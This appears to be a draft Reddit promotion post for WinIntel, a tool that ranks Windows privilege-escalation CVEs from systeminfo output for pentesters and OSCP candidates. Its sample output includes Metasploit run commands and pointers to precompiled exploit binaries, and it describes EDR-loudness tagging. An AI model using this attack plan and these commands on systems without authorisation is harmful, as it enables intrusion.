SUBREDDITS (post in this order, space them a day or two apart):
  r/netsec          - main technical security community, most visibility (Tool flair)
  r/oscp            - directly relevant to OSCP/OSCP+ candidates
  r/hacking         - broader audience (Tool flair)
  r/HowToHack       - beginners benefit from the ranked attack plan
  r/cybersecurity   - large general audience

==============================================================
TITLE (pick one):

  [Tool] WinIntel - paste systeminfo output, get a ranked Windows privilege-escalation
  plan with Metasploit modules, precompiled binaries, and in-the-wild markers

  [Tool] I built WinIntel: systeminfo.txt -> scored LPE attack plan (118 CVEs, XP to Win11),
  shows MSF + binary + ExploitDB for every CVE so you're not locked into msfconsole

==============================================================
BODY:

Hey r/netsec,

I built **WinIntel** while prepping for OSCP+ because I got tired of running WES-NG, getting
a wall of CVE IDs, and then manually checking each one: is there a Metasploit module? a
precompiled binary? was it actually exploited in the wild? which do I try first?

WinIntel answers all of that in one pass and ranks the results by how likely they are to work.

**What makes it different from Watson / WES-NG:**

Both are great but they hand you CVE IDs and links and stop there. WinIntel adds a scoring
engine that ranks every finding 0-100 based on patch confidence, exploit availability,
reliability, and in-the-wild status - so the output is a prioritized decision, not a list
you still have to triage.

It also shows EVERY delivery method for each CVE, not just one:
- MSF    - exact Metasploit module + copy-paste run commands
- BINARY - precompiled .exe from SecWiki (no compiling, no msfconsole)
- EDB    - ExploitDB ID
- PoC    - standalone GitHub exploits where they exist

So if you don't use Metasploit, you still get a working path.

**Sample output (--quick mode):**

```
WinIntel v1.0.0  --quick mode
  Microsoft Windows Server 2008 R2  Build 7600  Arch X64  HFs 0
  CONFIRMED:18  LIKELY:5  (lpe-only, kb-deduped, exploitable only, no noise)

  #1  88  TRY FIRST  CVE-2014-4113  Great ITW   Kernel Driver
      Win32k.sys use-after-free (track popup menu) - local SYSTEM
      MSF     use exploit/windows/local/ms14_058_track_popup_menu
              set SESSION 1; set LHOST tun0; set LPORT 4444; run
      BINARY  Precompiled .exe -> SecWiki/MS14-058
      EDB     https://www.exploit-db.com/exploits/35101
```

**Accuracy model:**

- CONFIRMED - KB identified and not in installed hotfixes (proven vulnerable)
- LIKELY    - no KB; build number falls in a known-vulnerable range
- MANUAL    - can't determine from systeminfo (hidden by default)

Plus smart filtering that cuts the noise:
- Architecture-aware: x86-only exploits hidden on x64 targets (no KiTrap0D on a 64-bit box)
- Build-cap aware: a 2016-era CVE won't false-positive on Server 2022
- EOL-aware: post-2022 CVEs on an EOL build (e.g. Win10 1511) drop to LIKELY because the
  patch was never issued for that build - it IS vulnerable, but there's no KB to verify against
- Service-gated: EternalBlue won't show unless you confirm SMB is reachable
- Domain-aware: Kerberos attacks (MS14-068, ZeroLogon) only when actually domain-joined

**Other features:**

- 118 CVEs, 2003-2026, Windows XP through Win11 24H2
- Exploit-chain detection (SeImpersonate -> Potato -> SYSTEM, MS14-068 -> Domain Admin, etc.)
- EDR awareness - tags exploits as loud (heavily signatured) vs quiet (token/file-based)
- CISA KEV badges (46 CVEs on the federal known-exploited list)
- Self-contained HTML report export (dark themed, score bars, copy buttons, print-to-PDF)
- Exports: CSV, JSON, Metasploit .rc resource script
- Real-time --update pulls fresh CVE definitions from GitHub
- Single Python file, only dependency is `rich` (optional - falls back to plain text)
- Builds to a standalone .exe via GitHub Actions

**Usage:**

```bash
pip install rich
python winintel.py -i systeminfo.txt            # full ranked output
python winintel.py -i systeminfo.txt --quick    # top 8, zero noise
python winintel.py -i systeminfo.txt --html report.html   # HTML report
python winintel.py -i systeminfo.txt --services smb,rdp,print   # add confirmed services
python winintel.py --update                     # refresh CVE data
```

**GitHub:** https://github.com/drgoteee/winintel

Feedback and PRs welcome - especially newer CVEs and build-range data corrections.

Credits: rasta-mouse (Watson), bitsadmin (WES-NG), SecWiki/windows-kernel-exploits.
AI-assisted build, validated against a spread of HTB/PG boxes from 2003 to 2025.

==============================================================
TIPS:
- Post Tuesday/Wednesday morning UTC for best r/netsec visibility
- Screenshot the --quick output or an HTML report - the visual sells it faster than text
- For "how is this different from WES-NG?" point at the scoring + multi-method output
- AV evasion / Defender bypass is out of scope by design - say so if asked
